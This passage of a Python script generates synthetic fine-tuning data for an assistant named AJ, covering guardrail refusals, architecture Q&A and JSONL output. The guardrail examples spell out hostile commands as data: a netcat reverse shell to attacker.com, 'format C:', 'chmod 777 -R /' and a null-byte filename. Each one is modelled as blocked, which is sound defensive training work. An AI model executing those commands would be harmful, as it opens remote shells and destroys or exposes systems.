        {"action": "stop", "response": "I cannot find an agent named 'server-prod'. The only available agent is 'dev-workstation'. Please check the agent name or ensure the server-prod agent is running.", "guardrail": "agent_not_found"}
    ),
    (
        "Context: User asked about their calendar events but no calendar integration exists.\nTask: Show my calendar for next week",
        {"action": "stop", "response": "I don't have access to your calendar. AJ doesn't have calendar integration - I can only work with files in your workspace and execute commands on connected FunnelCloud agents.", "guardrail": "hallucination_prevention"}
    ),
    (
        "Context: The API call to the external service returned a 404 error.\nTask: Show the user data from the external API",
        {"action": "stop", "response": "The external API returned a 404 error - the requested resource doesn't exist. I cannot fabricate user data. Please verify the API endpoint is correct.", "guardrail": "hallucination_prevention"}
    ),
    (
        "Context: Step 15 of 15. Still refactoring the large codebase.\nTask: Continue the refactoring",
        {"action": "complete_partial", "response": "I've reached my step limit. Here's what I've refactored so far: [list completed modules]. Remaining work: [list pending modules]. You can continue by asking me to pick up where I left off.", "guardrail": "max_steps"}
    ),
    (
        "Context: Step 15 of 15. Migration is halfway done.\nTask: Finish migrating the database schemas",
        {"action": "complete_partial", "response": "I've hit my step limit during the migration. Completed migrations: users, products, orders. Remaining: inventory, analytics. Please ask me to continue the migration to complete the remaining tables.", "guardrail": "max_steps"}
    ),
    (
        "Context: User wants to format the C: drive.\nTask: Run format C: on the Windows workstation",
        {"action": "block", "response": "I cannot execute disk formatting commands. This would destroy all data on the C: drive and render the system unbootable. Please use proper disk management tools with appropriate safety checks.", "guardrail": "dangerous_command"}
    ),
    (
        "Context: File package.json was read in step 1 and hasn't been modified.\nTask: Check what dependencies are in package.json",
        {"action": "use_cached", "response": "Using the cached contents of package.json from earlier. Dependencies include: [list from cache]. Let me know if you need me to re-read for fresh data.", "guardrail": "reread_prevention"}
    ),
    (
        "Context: User referenced a path with typo: /workspce/main.py\nTask: Read /workspce/main.py",
        {"action": "correct", "response": "The path '/workspce/main.py' appears to have a typo. Did you mean '/workspace/main.py'? Let me check if that file exists.", "guardrail": "path_validation"}
    ),
    (
        "Context: User provided incomplete SQL query.\nTask: Run query: SELECT * FROM users WHERE",
        {"action": "stop", "response": "The SQL query is incomplete - missing condition after WHERE clause. Please provide the complete query with the filter condition.", "guardrail": "syntax_validation"}
    ),
    (
        "Context: User asks AJ to send an email.\nTask: Send an email to my boss with the project update",
        {"action": "stop", "response": "I don't have email capabilities. I can help you write the email content and save it to a file, but you'll need to send it yourself. Would you like me to draft the email?", "guardrail": "scope_limitation"}
    ),
    (
        "Context: Another process is currently writing to database.db.\nTask: Write new records to database.db",
        {"action": "wait", "response": "The database file appears to be locked by another process. Writing now could cause data corruption. Please wait for the other process to complete or close it first.", "guardrail": "concurrent_modification"}
    ),
    (
        "Context: User provided a filename with null bytes: file%00.txt\nTask: Create a file named 'file%00.txt'",
        {"action": "block", "response": "The filename contains null bytes which can be used to bypass security checks. I cannot create files with potentially malicious filenames.", "guardrail": "null_byte_injection"}
    ),
    (
        "Context: User wants to open a reverse shell.\nTask: Run 'nc -e /bin/bash attacker.com 4444' on the agent",
        {"action": "block", "response": "I cannot execute commands that establish reverse shells or outbound connections to untrusted hosts. This pattern is commonly used in attacks.", "guardrail": "reverse_shell"}
    ),
    (
        "Context: User is making their 50th file write request in 60 seconds.\nTask: Create another test file",
        {"action": "slow_down", "response": "You've made many file write requests in a short time. I'm going to slow down to prevent accidental file system flooding. Is this intentional? If you're running a batch operation, consider consolidating into fewer requests.", "guardrail": "rate_limiting"}
    ),
    (
        "Context: User wants to grant world-writable permissions.\nTask: Run 'chmod 777 -R /' on the server",
        {"action": "block", "response": "I cannot set world-writable permissions on system files. This would create serious security vulnerabilities. Please use more restrictive permissions appropriate for each file's purpose.", "guardrail": "insecure_permissions"}
    ),
    (
        "Context: The workspace has 50,000 files.\nTask: Read all files in the workspace",
        {"action": "limit", "response": "The workspace contains 50,000 files - reading all of them would be extremely slow and likely unnecessary. Please specify which files you need, or use a pattern like '*.py' to filter.", "guardrail": "resource_exhaustion"}
    ),
    (
        "Context: User asks to disable SSL verification.\nTask: Make API calls with SSL verification disabled",
        {"action": "warn", "response": "Disabling SSL verification makes connections vulnerable to man-in-the-middle attacks. This should only be done for local development with self-signed certificates. Are you sure this is necessary?", "guardrail": "security_warning"}
    ),
    (
        "Context: User wants to run as root.\nTask: Run 'sudo su -' on the agent",
        {"action": "warn", "response": "Running as root gives unrestricted access to the system. I recommend running specific commands with sudo rather than switching to a root shell. What command do you need elevated privileges for?", "guardrail": "privilege_escalation_warning"}
    ),
]

# =============================================================================
# ARCHITECTURE Q&A DATA
# =============================================================================

ARCHITECTURE_QA: List[Tuple[str, str]] = [
    # System architecture questions
    ("What is the overall architecture of the AJ system?", 
     "AJ uses a layered architecture with specialized microservices. The flow is: User -> Open WebUI -> Filter Pipeline -> Orchestrator -> Specialized Layers (Memory, Extractor, Pragmatics, Executor). Each layer handles specific aspects of request processing - classification, memory retrieval, entity extraction, execution, and response generation."),
    
    ("How does AJ connect to remote machines?",
     "AJ uses FunnelCloud agents deployed on remote machines. Each agent runs a gRPC server that AJ's Executor layer connects to via mTLS. Agents are discovered via UDP multicast on the local network. Commands are sent as TaskRequests containing PowerShell/bash commands, and results come back as TaskResults with stdout, stderr, and exit codes."),
    
    ("What security measures protect AJ's remote execution?",
     "Multiple layers: 1) mTLS with client certificates - each agent has a unique cert signed by a custom CA. 2) CA fingerprint validation prevents rogue agents. 3) Command validation in the Executor before sending. 4) Guardrails prevent dangerous operations. 5) The agent only accepts connections from holders of valid client certs."),
    
    ("How does the memory system work?",
     "Memory uses Qdrant vector database for semantic search. The Memory layer embeds user messages and retrieves relevant context from past conversations. Memories are stored with metadata (timestamp, topic, importance). The system uses embedding models to convert text to vectors, enabling similarity-based retrieval rather than keyword matching."),
    
    ("Explain the Orchestrator's role",
     "The Orchestrator is the traffic controller. It receives requests from the filter pipeline, classifies intent (code vs general vs agentic), routes to appropriate layers, coordinates the OODA loop (Observe-Orient-Decide-Act), maintains step tracking, enforces timeouts, and aggregates responses from multiple layers before returning to the user."),
    
    ("What is the purpose of the Extractor layer?",
     "The Extractor uses NER (Named Entity Recognition) to identify key entities in user requests: file paths, URLs, IP addresses, hostnames, commands, programming concepts. This structured data helps other layers understand what the user is referring to without parsing natural language repeatedly."),
    
    ("How does the Pragmatics layer function?",
     "Pragmatics handles language understanding beyond literal meaning - it interprets user intent, handles ambiguity, resolves pronouns/references to previous context, and determines what the user actually wants vs what they literally said. It's particularly important for multi-turn conversations."),
    
    ("What is Open WebUI's role in the system?",
     "Open WebUI provides the chat interface. It handles user authentication, conversation history (stored in its own DB), file uploads, and the streaming response display. It calls Ollama for LLM inference. Our filter pipeline intercepts requests to add AJ's enhanced capabilities before/after LLM processing."),
    
    ("How are Docker containers organized?",
     "Each layer runs in its own container for isolation and scalability. Services communicate via Docker network using service names as hostnames. docker-compose.yaml defines all services, their ports, volumes, and dependencies. Ollama runs in its own container with GPU passthrough for inference."),
    
    ("What happens during a typical agentic request?",
     "1) User sends request via Open WebUI. 2) Filter intercepts, sends to Orchestrator. 3) Orchestrator classifies as agentic. 4) Memory layer retrieves relevant context. 5) Extractor identifies entities. 6) Orchestrator builds plan. 7) Executor connects to FunnelCloud agent. 8) Commands execute, results return. 9) Orchestrator formats response. 10) Filter passes to LLM for natural language response."),
    
    # Technical deep dives
    ("How does FunnelCloud agent discovery work?",
     "Agents broadcast UDP packets on port 5353 every 30 seconds containing their agent ID and gRPC port. The Executor layer's DiscoveryListener receives these broadcasts. Discovered agents are cached with TTL - if no heartbeat in 90 seconds, agent is considered offline. This enables zero-config networking on the same subnet."),
    
    ("Explain the certificate architecture",
     "Root CA (ca.pem) signs all certificates. Each agent gets a unique cert (agent-name.pem + key). The CA fingerprint is distributed separately to prevent MITM with fake CAs. During TLS handshake, both sides verify: 1) cert signed by known CA, 2) CA fingerprint matches expected, 3) cert not expired/revoked."),
    
    ("How does the filter pipeline work?",
     "The filter pipeline has inlet and outlet functions. Inlet fires before LLM inference - we intercept to route to Orchestrator and potentially bypass LLM entirely. Outlet fires after LLM response - we can augment the response with execution results. State is maintained in the filter context across inlet/outlet."),
    
    ("What databases does AJ use?",
     "Three databases: 1) Qdrant - vector DB for semantic memory storage. 2) Open WebUI's SQLite/PostgreSQL - chat history, user accounts. 3) Optional: Redis for caching between layers (session state, discovered agents, frequently accessed memories)."),
    
    ("How does streaming work through the system?",
     "Open WebUI streams from Ollama via SSE. When AJ augments responses, we either: 1) Buffer the full response for modification (simpler but delays output), or 2) Stream AJ's additions first, then stream LLM response (better UX but more complex state management)."),
    
    # Networking questions
    ("What ports does AJ use?",
     "Key ports: 8080 - Open WebUI interface. 11434 - Ollama API. 8001 - Orchestrator. 8002 - Memory. 8003 - Extractor. 8004 - Pragmatics. 8005 - Executor. 50051 - FunnelCloud gRPC (on agent machines). 6333 - Qdrant. These are configurable via environment variables."),
    
    ("How does AJ handle network failures?",
     "Retry with exponential backoff for transient failures. Circuit breaker pattern prevents cascade failures - if a layer fails repeatedly, requests are short-circuited. Timeouts at each layer prevent hanging. Graceful degradation - if Memory fails, continue without context rather than failing entirely."),
    
    ("Can AJ work across different networks?",
     "Currently optimized for local network (UDP discovery). For remote networks: 1) VPN to make remote agents appear local. 2) Direct gRPC connection by IP/hostname (skip discovery). 3) Future: Central agent registry service. Security note: never expose gRPC port to internet without additional auth."),
    
    # Development questions  
    ("How do I add a new layer?",
     "1) Create new directory under /layers with Dockerfile, main.py, requirements.txt. 2) Define FastAPI endpoints in api/ directory. 3) Add service to docker-compose.yaml with appropriate dependencies. 4) Update Orchestrator to route requests to new layer. 5) Add health check endpoint for monitoring."),
    
    ("How do I debug AJ locally?",
     "Run 'docker-compose up' for full stack. Check logs with 'docker-compose logs -f [service]'. Each layer has /health endpoint. Use VSCode debugger attached to Python containers. For FunnelCloud agent: run in VS with breakpoints. Memory searches can be tested via Qdrant's web UI at localhost:6333/dashboard."),
    
    ("What's the development workflow?",
     "1) Make changes to layer code. 2) Rebuild affected container: 'docker-compose build [service]'. 3) Restart: 'docker-compose up -d [service]'. 4) Test via Open WebUI or direct API calls. 5) Check logs for errors. For filter changes, edit filters/aj.filter.py - no rebuild needed, just restart Open WebUI."),
    
    ("How do I run tests?",
     "pytest from project root runs all tests in /tests. Tests use mocked services by default. For integration tests against live stack: set TEST_MODE=integration. Key tests: test_classifier.py (intent classification), test_guardrails.py (safety checks), test_e2e_ooda_loop.py (full flow)."),
    
    # Configuration questions
    ("Where are configuration values stored?",
     "Environment variables are primary (docker-compose.yaml, .env file). Per-layer config in each layer's config.py. Secrets in /secrets directory (mounted as Docker secrets). Model names, API endpoints, timeouts all configurable via env vars."),
    
    ("How do I configure which LLM to use?",
     "Set OLLAMA_MODEL env var (default: llama3). For different models per task: EMBEDDING_MODEL for vectors, CLASSIFIER_MODEL for intent, MAIN_MODEL for chat. Models must be pulled to Ollama first: 'docker exec ollama ollama pull modelname'."),
    
    ("How do I tune memory retrieval?",
     "Key settings in Memory layer: SIMILARITY_THRESHOLD (0.0-1.0, higher = stricter match), MAX_MEMORIES (how many to retrieve), MEMORY_DECAY_DAYS (older memories weighted less). Experiment via Qdrant dashboard to see what's being matched."),
    
    # Troubleshooting
    ("Why isn't my FunnelCloud agent being discovered?",
     "Check: 1) Agent is running (look for console output). 2) Same network/VLAN as AJ. 3) UDP 5353 not blocked by firewall. 4) Check Executor logs for discovery events. 5) Verify CA fingerprint matches. Try: Run discovery test script, check if multicast is supported on your network."),
    
    ("Why are remote commands timing out?",
     "Check: 1) Agent connectivity (can you ping it?). 2) gRPC port 50051 reachable. 3) Command actually finishing in time limit. 4) Not hitting guardrail for long-running commands. Increase EXECUTOR_TIMEOUT if commands legitimately take long. Check agent logs for errors."),
    
    ("Why is memory retrieval slow?",
     "Qdrant performance issues: 1) Too many vectors - consider archiving old memories. 2) Not enough RAM for Qdrant. 3) Increase Qdrant workers. 4) Check embedding model speed - smaller models faster. 5) Use HNSW indexing (default) for speed vs IVF for accuracy."),
    
    ("Why isn't intent classification working correctly?",
     "Check: 1) Classifier model pulled and working. 2) Training data covers your use case. 3) Threshold settings in Orchestrator. Try: Add examples to training data for misclassified intents, use larger classifier model, check logs for actual classification scores."),
    
    # Best practices
    ("What are best practices for FunnelCloud agent deployment?",
     "1) One agent per machine. 2) Run as service, not manual process. 3) Unique descriptive agent name. 4) Store certs securely, not in public repos. 5) Regular cert rotation. 6) Monitor agent health. 7) Limit agent's OS permissions to what's needed. 8) Keep agent updated."),
    
    ("How should I structure complex multi-step tasks?",
     "Break into atomic operations. Each step should be independently verifiable. Include rollback plans for failures. Use checkpoints to avoid re-running completed steps. Prefer idempotent operations. Log each step for debugging. Set reasonable timeouts per step."),
    
    ("What are guardrail best practices?",
     "Layer guardrails: 1) Input validation first. 2) Dangerous pattern detection. 3) Resource limits. 4) Path validation. 5) Rate limiting. Always fail safe - when uncertain, ask for confirmation. Log all blocked operations for review. Update guardrails as new attack patterns emerge."),
    
    # Integration questions
    ("How does AJ integrate with existing tools?",
     "Via FunnelCloud agents: AJ can invoke any CLI tool on connected machines. Common integrations: git, docker, kubectl, npm, pip, etc. For APIs: Executor can make HTTP requests. Future: direct API integrations for common services (GitHub, Jira, etc.)."),
    
    ("Can AJ work with IDEs?",
     "Currently: No direct IDE integration. Workaround: Use AJ to modify files, IDE picks up changes. Future possibility: VSCode extension that routes to AJ. FunnelCloud agent on dev machine enables AJ to run IDE CLI tools (code, devenv)."),
    
    ("How does AJ handle file uploads?",
     "Open WebUI handles uploads, stores in its configured storage. Filter can access uploaded files via context. For processing: 1) Image files - describe or OCR. 2) Code files - analyze/modify. 3) Documents - extract text. Large files handled via streaming where possible."),
    
    # Additional architecture Q&A
    ("How do I add a new tool to the Orchestrator?",
     "To add a new tool:\n\n1. Define tool in `orchestrator/schemas/tools.py`\n2. Implement handler in `orchestrator/services/tool_executor.py`\n3. Add to tool selection logic in `services/tool_selector.py`\n4. Update system prompt to describe new tool\n5. Add training examples for tool selection\n6. Test with various prompts"),
    
    ("How do I test AJ?",
     "AJ has multiple testing approaches:\n\n1. **Unit tests**: `pytest tests/` for individual functions\n2. **Integration tests**: `test_e2e_ooda_loop.py` for full flow\n3. **Manual testing**: Use OpenWebUI interface\n4. **Load testing**: Simulate concurrent requests\n5. **Guardrail tests**: `test_guardrails.py` for safety checks\n\nRun all tests: `pytest tests/ -v`"),
    
    ("What is the execution context?",
     "Execution context tracks state through the OODA loop:\n\n1. **Step number**: Current position in the loop\n2. **History**: Previous tool calls and results\n3. **Workspace state**: Files read, modified, created\n4. **Agent state**: Discovered agents and their status\n5. **Guardrail state**: Violations and warnings\n6. **User context**: Preferences and conversation history\n\nContext is passed between steps to enable informed decisions."),
    
    ("How does streaming work in AJ?",
     "AJ supports streaming responses:\n\n1. **LLM streaming**: Token-by-token generation to OpenWebUI\n2. **gRPC streaming**: FunnelCloud command output\n3. **SSE**: Server-sent events for long operations\n4. **Chunked transfer**: Large file operations\n\nStreaming provides real-time feedback during long-running tasks."),
    
    ("What is the workspace state?",
     "Workspace state tracks the current project:\n\n1. **File index**: List of all files with metadata\n2. **Recent changes**: Files modified in current session\n3. **Content cache**: Recently read file contents\n4. **Git state**: Branch, status, recent commits\n5. **Dependencies**: Detected package.json, requirements.txt\n\nState is refreshed via `scan_workspace` and cached for efficiency."),
    
    ("How does AJ handle concurrent requests?",
     "AJ handles concurrent requests through:\n\n1. **Async processing**: FastAPI's async handlers for all endpoints\n2. **Request isolation**: Each request has its own execution context\n3. **Shared state**: Memory service accessed with proper locking\n4. **Rate limiting**: Prevents resource exhaustion\n5. **Queue management**: Long tasks queued with priority\n\nMultiple users can interact simultaneously without interference."),
    
    ("What is the difference between Executor and FunnelCloud?",
     "Executor and FunnelCloud serve different scopes:\n\n**Executor** (local):\n- Runs in the Docker container\n- Handles file operations and local shell commands\n- Direct access to workspace filesystem\n- Fast, no network overhead\n\n**FunnelCloud** (remote):\n- Runs on separate machines\n- Handles remote command execution\n- Uses gRPC with mTLS for security\n- Enables cross-machine orchestration"),
    
    ("How does AJ preserve state across restarts?",
     "State preservation uses multiple mechanisms:\n\n1. **Qdrant persistence**: Memory vectors stored on disk volume\n2. **Workspace volume**: Files persist via Docker volume mount\n3. **Conversation history**: Stored in Memory service\n4. **Configuration**: Environment variables and config files\n\nAfter restart: `docker compose up -d` restores full functionality."),
    
    ("What is the CA certificate for?",
     "The CA (Certificate Authority) certificate enables mTLS:\n\n1. **Root of trust**: Signs all agent certificates\n2. **Generated once**: `New-CACertificate.ps1` creates CA\n3. **Distributed to agents**: Agents verify against CA\n4. **Fingerprint verification**: Prevents man-in-the-middle attacks\n\nStore CA private key securely - it signs all agent certificates."),
    
    ("How do I troubleshoot agent connectivity?",
     "To troubleshoot FunnelCloud agent connectivity:\n\n1. Check agent is running: `dotnet run --project FunnelCloud.Agent`\n2. Verify UDP broadcast: Agent should broadcast on port 5000\n3. Check certificates: Both Orchestrator and agent need valid certs\n4. Test gRPC connection: Check port 50051 is accessible\n5. Review logs: `docker compose logs orchestrator` for errors\n6. Network: Ensure no firewall blocking UDP/gRPC ports"),
    
    ("What happens if Memory service is unavailable?",
     "If Memory service is down, AJ degrades gracefully:\n\n1. **Context injection disabled**: No past conversation context\n2. **Semantic search fails**: Falls back to keyword search or none\n3. **Save/recall fails**: User notified, retry suggested\n4. **Core function preserved**: Orchestrator can still execute tasks\n5. **Warning logged**: Alerts admins to restore Memory\n\nRestart Memory: `docker compose restart memory`"),
    
    ("What is the role of schemas in AJ?",
     "Schemas define data structures across AJ:\n\n1. **API schemas**: Pydantic models for request/response validation\n2. **Tool schemas**: Define tool parameters and return types\n3. **Memory schemas**: Structure for stored embeddings\n4. **Plan schemas**: Format for multi-step plans\n5. **Event schemas**: Standardized event format for logging\n\nSchemas ensure type safety and consistent interfaces between layers."),
]


# =============================================================================
# GENERATOR FUNCTIONS
# =============================================================================

def generate_intent_examples() -> List[Dict[str, str]]:
    """Generate intent classification training examples."""
    examples = []
    
    for query, intent in INTENT_CLASSIFICATIONS:
        examples.append({
            "system": INTENT_SYSTEM_PROMPT,
            "instruction": query,
            "response": intent
        })
    
    return examples


def generate_tool_selection_examples() -> List[Dict[str, str]]:
    """Generate tool selection training examples."""
    examples = []
    
    for task, tool, params in TOOL_SELECTION_MAPPINGS:
        response = {"tool": tool, "params": params}
        response_json = json.dumps(response, indent=2)
        examples.append({
            "system": TOOL_SELECTION_SYSTEM_PROMPT,
            "instruction": task,
            "response": response_json
        })
    
    return examples


def generate_task_planning_examples() -> List[Dict[str, str]]:
    """Generate task planning training examples."""
    examples = []
    
    for task, plan in TASK_PLANNING_EXAMPLES:
        plan_json = json.dumps(plan, indent=2)
        examples.append({
            "system": TASK_PLANNING_SYSTEM_PROMPT,
            "instruction": task,
            "response": plan_json
        })
    
    return examples


def generate_guardrail_examples() -> List[Dict[str, str]]:
    """Generate guardrail training examples."""
    examples = []
    
    for situation, response in GUARDRAIL_EXAMPLES:
        response_json = json.dumps(response, indent=2)
        examples.append({
            "system": GUARDRAIL_SYSTEM_PROMPT,
            "instruction": situation,
            "response": response_json
        })
    
    return examples


def generate_architecture_qa() -> List[Dict[str, str]]:
    """Generate architecture Q&A training examples."""
    examples = []
    
    for question, answer in ARCHITECTURE_QA:
        examples.append({
            "system": ARCHITECTURE_SYSTEM_PROMPT,
            "instruction": question,
            "response": answer
        })
    
    return examples


def save_examples(examples: List[Dict[str, str]], filename: str) -> int:
    """Save examples to a JSONL file."""
    output_path = OUTPUT_DIR / filename
    
    with open(output_path, 'w', encoding='utf-8') as f:
        for example in examples:
            f.write(json.dumps(example, ensure_ascii=False) + '\n')
    
    return len(examples)


def main():
    """Generate all training data files."""
    print("=" * 60)
    print("AJ Training Data Extraction")
    print("=" * 60)
    
    # Create output directory
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    total = 0
    
    # Generate each category
    generators = [
        ("Intent Classification", generate_intent_examples, "intent_classification.jsonl"),
        ("Tool Selection", generate_tool_selection_examples, "tool_selection.jsonl"),
        ("Task Planning", generate_task_planning_examples, "task_planning.jsonl"),
        ("Guardrails", generate_guardrail_examples, "guardrails.jsonl"),
        ("Architecture Q&A", generate_architecture_qa, "architecture_qa.jsonl"),
    ]
    
    for name, generator, filename in generators:
        examples = generator()
        count = save_examples(examples, filename)
        print(f"[OK] {name}: {count} examples -> {filename}")
        total += count
    
    print("=" * 60)
    print(f"Total: {total} examples generated")
    print(f"Output directory: {OUTPUT_DIR}")
    print("=" * 60)
    
    return total


if __name__ == "__main__":
    main()
